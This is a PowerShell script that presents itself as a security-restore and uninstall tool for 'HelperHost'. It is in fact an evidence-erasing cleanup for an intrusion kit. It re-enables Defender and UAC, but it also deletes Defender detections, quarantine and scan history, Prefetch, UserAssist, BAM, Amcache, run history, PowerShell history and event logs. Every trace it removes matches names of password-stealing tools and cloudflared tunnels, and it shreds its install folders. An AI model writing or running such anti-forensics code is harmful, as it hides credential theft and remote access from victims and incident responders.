# Restores Windows security + removes HelperHost install side-effects.
# Safe to re-run. Prefer elevated (HelperHostWipeRestore task).
# UAC is restored LAST so mid-wipe elevated steps don't re-prompt.
$ErrorActionPreference = 'SilentlyContinue'
try { $PSNativeCommandUseErrorActionPreference = $false } catch {}
$hh = Join-Path $env:LOCALAPPDATA 'HelperHost'
$cache = Join-Path $env:TEMP 'HelperHostCache'
$tools = Join-Path $hh 'tools'

$mark = 'HelperHost|EdgeRelay|AgentSHE|agentshe|lilygopro|install-win|install\.ps1|install\.sh|HelperHostCache|AGENTSHE_|trycloudflare|ChromePass|WebBrowserPassView|PasswordFox|mailpv|mspass|netpass|iepv|Dialupass|PstPassword|BrowsingHistoryView|WirelessKeyView|WNetWatcher|hh-wipe|hh-restore|hh-export|early-av'

# Kill EarlyAV first so a reboot cannot re-disable Defender mid-restore
foreach ($tn in @('HelperHostEarlyAV', 'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot')) {
  Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
  schtasks /Delete /TN $tn /F 2>$null | Out-Null
}

# --- Load UAC backup now (folder deleted later); apply at END ---
$sysPol = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'
$uacBak = Join-Path $hh 'uac-backup.json'
$uj = $null
try {
  $regState = (Get-ItemProperty 'HKCU:\Software\HelperHost' -Name state -EA SilentlyContinue).state
  if ($regState) {
    $sj = $regState | ConvertFrom-Json
    if ($sj.uac_bak) {
      if ($sj.uac_bak -is [string]) { $uj = $sj.uac_bak | ConvertFrom-Json }
      else { $uj = $sj.uac_bak }
    }
  }
} catch {}
if (-not $uj -and (Test-Path $uacBak)) {
  try { $uj = Get-Content $uacBak -Raw | ConvertFrom-Json } catch {}
}

# --- Defender Security Center / UX / toast policies we set ---
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration' -Name Notification_Suppress -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableNotifications -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications' -Name DisableEnhancedNotifications -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Explorer' -Name DisableNotificationCenter -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoCloudApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotification -Force -EA SilentlyContinue
Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications' -Name NoToastApplicationNotificationOnLockScreen -Force -EA SilentlyContinue
if (Get-Command Set-MpPreference -EA SilentlyContinue) {
  Set-MpPreference -UILockdown $false -EA SilentlyContinue
}

# --- Remove ALL Defender org policies (cloud / samples / RTP / Spynet / MpEngine / WOW64) ---
foreach ($polRoot in @(
  'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender',
  'HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows Defender',
  'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center'
)) {
  if (Test-Path $polRoot) {
    Remove-Item $polRoot -Recurse -Force -EA SilentlyContinue
  }
}
Remove-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name EnableSmartScreen -Force -EA SilentlyContinue
Remove-Item 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Recurse -Force -EA SilentlyContinue
# Undo live (non-policy) RTP overrides we may have written
$rtpLive = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'
if (Test-Path $rtpLive) {
  foreach ($n in @(
    'DisableRealtimeMonitoring','DisableBehaviorMonitoring','DisableOnAccessProtection',
    'DisableScanOnRealtimeEnable','DisableIOAVProtection','DisableScriptScanning'
  )) {
    Remove-ItemProperty $rtpLive -Name $n -Force -EA SilentlyContinue
  }
}
# Tamper / Features leftovers
Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtection -Force -EA SilentlyContinue
Remove-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtectionSource -Force -EA SilentlyContinue

# Refresh policy cache so UI drops "géré par votre administrateur"
& gpupdate.exe /Target:Computer /Force | Out-Null

# --- Defender services ---
foreach ($svc in @('WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService', 'wscsvc', 'WdNisDrv', 'WdFilter', 'WdBoot', 'webthreatdefsvc', 'webthreatdefusersvc')) {
  $svcKey = "HKLM:\SYSTEM\CurrentControlSet\Services\$svc"
  if (Test-Path $svcKey) {
    # 2 = Automatic, 3 = Manual — prefer Automatic for core AV
    $start = if ($svc -in @('WdNisDrv', 'WdFilter', 'WdBoot')) { 1 } else { 2 }
    Set-ItemProperty $svcKey -Name Start -Value $start -Type DWord -Force -EA SilentlyContinue
  }
  & sc.exe config $svc start= demand | Out-Null
  if ($svc -in @('WinDefend', 'WdNisSvc', 'Sense', 'SecurityHealthService', 'wscsvc')) {
    & sc.exe config $svc start= auto | Out-Null
    Set-Service $svc -StartupType Automatic -EA SilentlyContinue
    Start-Service $svc -EA SilentlyContinue
  }
}

# --- Defender preferences + drop our exclusions ---
if (Get-Command Set-MpPreference -EA SilentlyContinue) {
  Set-MpPreference -DisableRealtimeMonitoring $false -EA SilentlyContinue
  Set-MpPreference -DisableBehaviorMonitoring $false -EA SilentlyContinue
  Set-MpPreference -DisableBlockAtFirstSeen $false -EA SilentlyContinue
  Set-MpPreference -DisableIOAVProtection $false -EA SilentlyContinue
  Set-MpPreference -DisableScriptScanning $false -EA SilentlyContinue
  Set-MpPreference -DisableArchiveScanning $false -EA SilentlyContinue
  Set-MpPreference -DisableEmailScanning $false -EA SilentlyContinue
  Set-MpPreference -DisableRemovableDriveScanning $false -EA SilentlyContinue
  Set-MpPreference -PUAProtection Enabled -EA SilentlyContinue
  Set-MpPreference -MAPSReporting Advanced -EA SilentlyContinue
  Set-MpPreference -SubmitSamplesConsent 1 -EA SilentlyContinue
  Set-MpPreference -EnableNetworkProtection Enabled -EA SilentlyContinue
  Set-MpPreference -CloudBlockLevel Default -EA SilentlyContinue
}
if (Get-Command Remove-MpPreference -EA SilentlyContinue) {
  Remove-MpPreference -ExclusionPath $hh -EA SilentlyContinue
  Remove-MpPreference -ExclusionPath $cache -EA SilentlyContinue
  Remove-MpPreference -ExclusionPath $tools -EA SilentlyContinue
  Remove-MpPreference -ExclusionProcess 'HelperHost.exe' -EA SilentlyContinue
  Remove-MpPreference -ExclusionProcess 'EdgeRelay.exe' -EA SilentlyContinue
  Remove-MpPreference -ExclusionExtension '.exe','.dll','.ps1','.bat','.cmd','.vbs','.zip','.txt' -EA SilentlyContinue
  if (Test-Path (Join-Path $hh 'HelperHost.exe')) {
    Remove-MpPreference -ControlledFolderAccessAllowedApplications (Join-Path $hh 'HelperHost.exe') -EA SilentlyContinue
  }
  if (Test-Path (Join-Path $hh 'EdgeRelay.exe')) {
    Remove-MpPreference -ControlledFolderAccessAllowedApplications (Join-Path $hh 'EdgeRelay.exe') -EA SilentlyContinue
  }
}
Remove-Item (Join-Path $hh '.av-off') -Force -EA SilentlyContinue

# Clear local Defender detections / history tied to our names (best-effort)
try {
  Get-MpThreatDetection -EA SilentlyContinue | Where-Object {
    ($_.Resources -join ' ') -match $mark
  } | ForEach-Object {
    Remove-MpThreat -ThreatID $_.ThreatID -EA SilentlyContinue
  }
} catch {}
$defPaths = @(
  "$env:ProgramData\Microsoft\Windows Defender\Quarantine",
  "$env:ProgramData\Microsoft\Windows Defender\Scans\History",
  "$env:LOCALAPPDATA\Packages\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\LocalState"
)
foreach ($dp in $defPaths) {
  if (Test-Path $dp) {
    Get-ChildItem $dp -Recurse -Force -EA SilentlyContinue | Where-Object {
      $_.Name -match $mark -or $_.FullName -match $mark
    } | Remove-Item -Recurse -Force -EA SilentlyContinue
  }
}

# --- Undo Soft Device Guard / SAC toggles from install (best-effort) ---
$ci = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
if (Test-Path $ci) {
  $cur = (Get-ItemProperty $ci -Name VerifiedAndReputablePolicyState -EA SilentlyContinue).VerifiedAndReputablePolicyState
  if ($null -ne $cur -and [int]$cur -eq 0) {
    Set-ItemProperty $ci -Name VerifiedAndReputablePolicyState -Value 1 -Type DWord -Force -EA SilentlyContinue
  }
}
$dg = 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard'
if (Test-Path $dg) {
  Remove-ItemProperty $dg -Name Locked -Force -EA SilentlyContinue
}
& bcdedit.exe /set '{current}' hypervisorlaunchtype Auto | Out-Null
& bcdedit.exe /deletevalue '{current}' vsmlaunchtype | Out-Null

# --- Scheduled tasks (again, after Defender) ---
foreach ($tn in @(
  'HelperHost', 'HelperHostResume', 'HelperHostBoot', 'HelperHostResumeBoot',
  'HelperHostWipeRestore', 'HelperHostEarlyAV', 'AgentShePC'
)) {
  Unregister-ScheduledTask -TaskName $tn -Confirm:$false -EA SilentlyContinue
  schtasks /Delete /TN $tn /F 2>$null | Out-Null
}

# --- Run key + Startup apps (Task Manager) ---
$run = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
foreach ($n in @('HelperHost', 'AgentShePC')) {
  Remove-ItemProperty -Path $run -Name $n -Force -EA SilentlyContinue
}
$approved = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run'
foreach ($n in @('HelperHost', 'AgentShePC')) {
  Remove-ItemProperty -Path $approved -Name $n -Force -EA SilentlyContinue
}

# --- RunMRU ---
$mru = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU'
if (Test-Path $mru) {
  $props = Get-ItemProperty $mru -EA SilentlyContinue
  $drop = @()
  foreach ($p in $props.PSObject.Properties) {
    if ($p.Name -in @('PSPath', 'PSParentPath', 'PSChildName', 'PSDrive', 'PSProvider', 'MRUList')) { continue }
    if ([string]$p.Value -match $mark) { $drop += $p.Name }
  }
  foreach ($n in $drop) { Remove-ItemProperty -Path $mru -Name $n -Force -EA SilentlyContinue }
  if ($drop.Count -gt 0) { Remove-ItemProperty -Path $mru -Name MRUList -Force -EA SilentlyContinue }
}

# --- UserAssist / BAM / AppCompat flags mentioning us ---
$ua = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist'
Get-ChildItem $ua -Recurse -EA SilentlyContinue | ForEach-Object {
  try {
    $item = $_
    $vals = Get-ItemProperty $item.PSPath -EA SilentlyContinue
    foreach ($p in $vals.PSObject.Properties) {
      if ($p.Name -match 'PS') { continue }
      if ($p.Name -match $mark) {
        Remove-ItemProperty -Path $item.PSPath -Name $p.Name -Force -EA SilentlyContinue
      }
    }
  } catch {}
}
Get-ChildItem 'HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings' -EA SilentlyContinue | ForEach-Object {
  $vals = Get-ItemProperty $_.PSPath -EA SilentlyContinue
  foreach ($p in $vals.PSObject.Properties) {
    if ($p.Name -match 'PS') { continue }
    if ($p.Name -match $mark -or ([string]$p.Value -match $mark)) {
      Remove-ItemProperty -Path $_.PSPath -Name $p.Name -Force -EA SilentlyContinue
    }
  }
}
Get-ChildItem 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache' -EA SilentlyContinue | Out-Null
$mui = 'HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache'
if (Test-Path $mui) {
  $vals = Get-ItemProperty $mui -EA SilentlyContinue
  foreach ($p in $vals.PSObject.Properties) {
    if ($p.Name -match 'PS') { continue }
    if ($p.Name -match $mark -or ([string]$p.Value -match $mark)) {
      Remove-ItemProperty -Path $mui -Name $p.Name -Force -EA SilentlyContinue
    }
  }
}

# --- Temp / leftover install artifacts ---
Get-ChildItem $env:TEMP -Filter 'HelperHost-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-*' -EA SilentlyContinue | Remove-Item -Force -Recurse -EA SilentlyContinue
Get-ChildItem $env:TEMP -Filter 'hh-export-*' -EA SilentlyContinue | Remove-Item -Force -EA SilentlyContinue

# Prefetch (HelperHost + tools + cloudflared rename)
$pf = "$env:SystemRoot\Prefetch"
if (Test-Path $pf) {
  Get-ChildItem $pf -EA SilentlyContinue | Where-Object {
    $_.Name -match '^(HELPERHOST|EDGERELAY|CHROMEPASS|WEBBROWSERPASSVIEW|PASSWORDFOX|MAILPV|MSPASS|NETPASS|IEPV|DIALUPASS|PSTPASSWORD|CLOUDFLARED)'
  } | Remove-Item -Force -EA SilentlyContinue
}

# Recent / Jump lists / AutomaticDestinations soft clean
foreach ($recentRoot in @(
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent'),
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\AutomaticDestinations'),
  (Join-Path $env:APPDATA 'Microsoft\Windows\Recent\CustomDestinations')
)) {
  Get-ChildItem $recentRoot -Force -EA SilentlyContinue | Where-Object {
    $_.Name -match $mark -or (Get-Content $_.FullName -Raw -EA SilentlyContinue) -match $mark
  } | Remove-Item -Force -EA SilentlyContinue
}

# PS / cmd history
$hist = Join-Path $env:APPDATA 'Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
if (Test-Path $hist) {
  (Get-Content $hist -EA SilentlyContinue) | Where-Object { $_ -notmatch $mark } | Set-Content $hist -Encoding UTF8
}

# AppCompat / Shimcache hint files (cannot fully clear Amcache without reboot; purge matching)
$am = "$env:ProgramData\Microsoft\Windows\AppCompat\Programs"
if (Test-Path $am) {
  Get-ChildItem $am -Recurse -Force -EA SilentlyContinue | Where-Object {
    $_.Name -match $mark -or $_.FullName -match $mark
  } | Remove-Item -Force -Recurse -EA SilentlyContinue
}

# Event logs: clear only channels we commonly hit (needs admin) — leave Security alone if access denied
foreach ($log in @('Windows PowerShell', 'Microsoft-Windows-PowerShell/Operational', 'Microsoft-Windows-TaskScheduler/Operational')) {
  try { wevtutil cl $log 2>$null } catch {}
}

# --- Restore notification settings from backup ---
$bak = Join-Path $hh 'notify-backup.json'
$push = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications'
$exp = 'HKCU:\Software\Policies\Microsoft\Windows\Explorer'
$ns = 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Notifications\Settings'
$j = $null
try {
  if ($regState) {
    $sj2 = $regState | ConvertFrom-Json
    if ($sj2.notify_bak) {
      if ($sj2.notify_bak -is [string]) { $j = $sj2.notify_bak | ConvertFrom-Json }
      else { $j = $sj2.notify_bak }
    }
  }
} catch {}
if (-not $j -and (Test-Path $bak)) {
  try { $j = Get-Content $bak -Raw | ConvertFrom-Json } catch {}
}
$toast = 1
if ($j -and $null -ne $j.toast_enabled) { $toast = [int]$j.toast_enabled }
New-Item $push -Force | Out-Null
Set-ItemProperty $push -Name ToastEnabled -Value $toast -Type DWord -Force
if ($j -and $null -ne $j.disable_notification_center) {
  New-Item $exp -Force | Out-Null
  Set-ItemProperty $exp -Name DisableNotificationCenter -Value ([int]$j.disable_notification_center) -Type DWord -Force
} else {
  Remove-ItemProperty $exp -Name DisableNotificationCenter -Force -EA SilentlyContinue
}
New-Item $ns -Force | Out-Null
$te = 1; if ($j -and $null -ne $j.toasts_enabled) { $te = [int]$j.toasts_enabled }
$atl = 1; if ($j -and $null -ne $j.allow_toast_above_lock) { $atl = [int]$j.allow_toast_above_lock }
$snd = 1; if ($j -and $null -ne $j.allow_notif_sound) { $snd = [int]$j.allow_notif_sound }
Set-ItemProperty $ns -Name NOC_GLOBAL_SETTING_TOASTS_ENABLED -Value $te -Type DWord -Force
Set-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_TOASTS_ABOVE_LOCK -Value $atl -Type DWord -Force
Set-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_NOTIFICATION_SOUND -Value $snd -Type DWord -Force
Remove-ItemProperty $ns -Name NOC_GLOBAL_SETTING_ALLOW_CRITICAL_TOASTS_ABOVE_LOCK -Force -EA SilentlyContinue
foreach ($sub in @(
  'Windows.SystemToast.SecurityAndMaintenance',
  'Windows.SystemToast.WindowsUpdate.Notification',
  'Windows.SystemToast.Explorer',
  'Windows.SystemToast.StartupApp',
  'Windows.SystemToast.Suggested',
  'Windows.SystemToast.AudioTroubleshooter',
  'Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI',
  'Windows.SystemToast.WindowsDefender.SecurityCenter',
  'Windows.SystemToast.WindowsDefender.Av'
)) {
  $p = "$ns\$sub"
  if (Test-Path $p) { Set-ItemProperty $p -Name Enabled -Value 1 -Type DWord -Force }
}
$baa = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\BackgroundAccessApplications'
if (Test-Path $baa) { Set-ItemProperty $baa -Name GlobalUserDisabled -Value 0 -Type DWord -Force }
Remove-Item $bak -Force -EA SilentlyContinue
Remove-Item $uacBak -Force -EA SilentlyContinue
Remove-Item 'HKCU:\Software\HelperHost' -Recurse -Force -EA SilentlyContinue

# Wipe install + cache trees (hard delete, never Recycle Bin)
foreach ($p in @($hh, $cache, $tools)) {
  if (Test-Path $p) {
    attrib -h -s /s /d "$p\*" 2>$null
    attrib -h -s $p 2>$null
    Get-ChildItem -LiteralPath $p -Recurse -Force -File -EA SilentlyContinue | ForEach-Object {
      try {
        $len = [Math]::Min($_.Length, 64MB)
        $fs = [IO.File]::Open($_.FullName, 'Open', 'Write', 'None')
        $buf = New-Object byte[] ([Math]::Min(262144, [int]$len))
        foreach ($fill in @([byte]0, [byte]0xFF, [byte]0)) {
          for ($i = 0; $i -lt $buf.Length; $i++) { $buf[$i] = $fill }
          [void]$fs.Seek(0, 'Begin')
          $left = $len
          while ($left -gt 0) {
            $n = [Math]::Min($buf.Length, $left)
            $fs.Write($buf, 0, $n)
            $left -= $n
          }
        }
        $fs.SetLength(0); $fs.Flush(); $fs.Close()
      } catch {}
    }
    cmd /c "rmdir /s /q `"$p`"" | Out-Null
    if (Test-Path $p) { Remove-Item -LiteralPath $p -Recurse -Force -EA SilentlyContinue }
  }
}
Clear-RecycleBin -Force -EA SilentlyContinue

# --- UAC LAST (keep silent during restore/shred above) ---
if (Test-Path $sysPol) {
  $lua = 1; if ($uj -and $null -ne $uj.EnableLUA) { $lua = [int]$uj.EnableLUA }
  $cpa = 5; if ($uj -and $null -ne $uj.ConsentPromptBehaviorAdmin) { $cpa = [int]$uj.ConsentPromptBehaviorAdmin }
  $psd = 1; if ($uj -and $null -ne $uj.PromptOnSecureDesktop) { $psd = [int]$uj.PromptOnSecureDesktop }
  $eid = 1; if ($uj -and $null -ne $uj.EnableInstallerDetection) { $eid = [int]$uj.EnableInstallerDetection }
  $cpu = 3; if ($uj -and $null -ne $uj.ConsentPromptBehaviorUser) { $cpu = [int]$uj.ConsentPromptBehaviorUser }
  Set-ItemProperty $sysPol -Name EnableLUA -Value $lua -Type DWord -Force
  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorAdmin -Value $cpa -Type DWord -Force
  Set-ItemProperty $sysPol -Name ConsentPromptBehaviorUser -Value $cpu -Type DWord -Force
  Set-ItemProperty $sysPol -Name PromptOnSecureDesktop -Value $psd -Type DWord -Force
  Set-ItemProperty $sysPol -Name EnableInstallerDetection -Value $eid -Type DWord -Force
}
Remove-Item $uacBak -Force -EA SilentlyContinue

Write-Output 'security-restored'
